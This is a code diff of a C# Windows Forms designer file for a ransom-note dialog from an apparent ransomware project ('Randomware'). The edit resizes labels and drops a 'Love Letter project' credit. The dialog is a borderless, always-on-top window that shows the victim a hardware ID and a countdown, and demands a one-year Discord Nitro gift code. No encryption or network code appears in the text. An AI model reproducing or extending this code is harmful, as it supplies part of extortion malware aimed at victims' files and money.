@@ -40,7 +40,6 @@ namespace Client.Armitage.Randomware
             this.button1 = new System.Windows.Forms.Button();
             this.label4 = new System.Windows.Forms.Label();
             this.button2 = new System.Windows.Forms.Button();
-            this.label6 = new System.Windows.Forms.Label();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.panel1.SuspendLayout();
             this.SuspendLayout();
@@ -79,7 +78,7 @@ namespace Client.Armitage.Randomware
             this.status_label.Font = new System.Drawing.Font("Segoe UI Symbol", 10.75F);
             this.status_label.Location = new System.Drawing.Point(310, 136);
             this.status_label.Name = "status_label";
-            this.status_label.Size = new System.Drawing.Size(17, 25);
+            this.status_label.Size = new System.Drawing.Size(13, 20);
             this.status_label.TabIndex = 5;
             this.status_label.Text = " ";
             // 
@@ -89,7 +88,7 @@ namespace Client.Armitage.Randomware
             this.label5.Font = new System.Drawing.Font("Segoe UI Symbol", 10.75F);
             this.label5.Location = new System.Drawing.Point(310, 112);
             this.label5.Name = "label5";
-            this.label5.Size = new System.Drawing.Size(215, 25);
+            this.label5.Size = new System.Drawing.Size(177, 20);
             this.label5.TabIndex = 4;
             this.label5.Text = "You have --- seconds left.";
             // 
@@ -111,7 +110,7 @@ namespace Client.Armitage.Randomware
             this.label2.Font = new System.Drawing.Font("Segoe UI Symbol", 10.75F);
             this.label2.Location = new System.Drawing.Point(310, 56);
             this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(175, 25);
+            this.label2.Size = new System.Drawing.Size(144, 20);
             this.label2.TabIndex = 2;
             this.label2.Text = "Your Hardware ID Is:";
             this.label2.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Clicked);
@@ -123,7 +122,7 @@ namespace Client.Armitage.Randomware
             this.label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(84)))), ((int)(((byte)(74)))));
             this.label1.Location = new System.Drawing.Point(307, 21);
             this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(322, 37);
+            this.label1.Size = new System.Drawing.Size(260, 30);
             this.label1.TabIndex = 1;
             this.label1.Text = "This is very unfortunate.";
             this.label1.Click += new System.EventHandler(this.Clicked);
@@ -147,7 +146,7 @@ namespace Client.Armitage.Randomware
             this.nitrokey.ForeColor = System.Drawing.Color.White;
             this.nitrokey.Location = new System.Drawing.Point(337, 498);
             this.nitrokey.Name = "nitrokey";
-            this.nitrokey.Size = new System.Drawing.Size(388, 39);
+            this.nitrokey.Size = new System.Drawing.Size(388, 33);
             this.nitrokey.TabIndex = 5;
             this.nitrokey.Text = "discord.gift/";
             // 
@@ -173,9 +172,9 @@ namespace Client.Armitage.Randomware
             this.label4.Font = new System.Drawing.Font("Segoe UI Symbol", 10.75F);
             this.label4.Location = new System.Drawing.Point(333, 470);
             this.label4.Name = "label4";
-            this.label4.Size = new System.Drawing.Size(197, 25);
+            this.label4.Size = new System.Drawing.Size(207, 20);
             this.label4.TabIndex = 4;
-            this.label4.Text = "Put the nitro code here:";
+            this.label4.Text = "Put the 1 year nitro code here:";
             // 
             // button2
             // 
@@ -192,23 +191,12 @@ namespace Client.Armitage.Randomware
             this.button2.UseVisualStyleBackColor = true;
             this.button2.Click += new System.EventHandler(this.button2_Click);
             // 
-            // label6
-            // 
-            this.label6.AutoSize = true;
-            this.label6.Font = new System.Drawing.Font("Segoe UI Symbol", 10.75F, System.Drawing.FontStyle.Bold);
-            this.label6.Location = new System.Drawing.Point(12, 571);
-            this.label6.Name = "label6";
-            this.label6.Size = new System.Drawing.Size(219, 25);
-            this.label6.TabIndex = 9;
-            this.label6.Text = "The Love Letter project.";
-            // 
             // Dialog
             // 
-            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 19F);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(37)))), ((int)(((byte)(45)))));
             this.ClientSize = new System.Drawing.Size(800, 600);
-            this.Controls.Add(this.label6);
             this.Controls.Add(this.button2);
             this.Controls.Add(this.label4);
             this.Controls.Add(this.button1);
@@ -218,7 +206,7 @@ namespace Client.Armitage.Randomware
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.ForeColor = System.Drawing.SystemColors.Control;
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
-           this.Name = "Dialog";
+            this.Name = "Dialog";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
             this.Text = "You upset me.";
             this.TopMost = true;
@@ -244,6 +232,5 @@ namespace Client.Armitage.Randomware
         private System.Windows.Forms.Button button2;
         private System.Windows.Forms.Label label5;
         private System.Windows.Forms.Label status_label;
-        private System.Windows.Forms.Label label6;
     }
 }
